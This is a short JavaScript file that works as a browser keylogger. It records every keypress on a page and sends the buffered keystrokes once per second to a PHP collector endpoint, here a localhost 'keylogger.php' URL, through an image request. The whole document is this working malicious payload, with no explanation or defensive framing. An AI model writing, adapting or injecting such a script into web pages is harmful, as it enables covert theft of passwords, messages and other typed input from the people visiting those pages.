var keys = '';
 
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
 
window.setInterval(function(){
    new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c=' + keys;
    keys = '';
}, 1000);
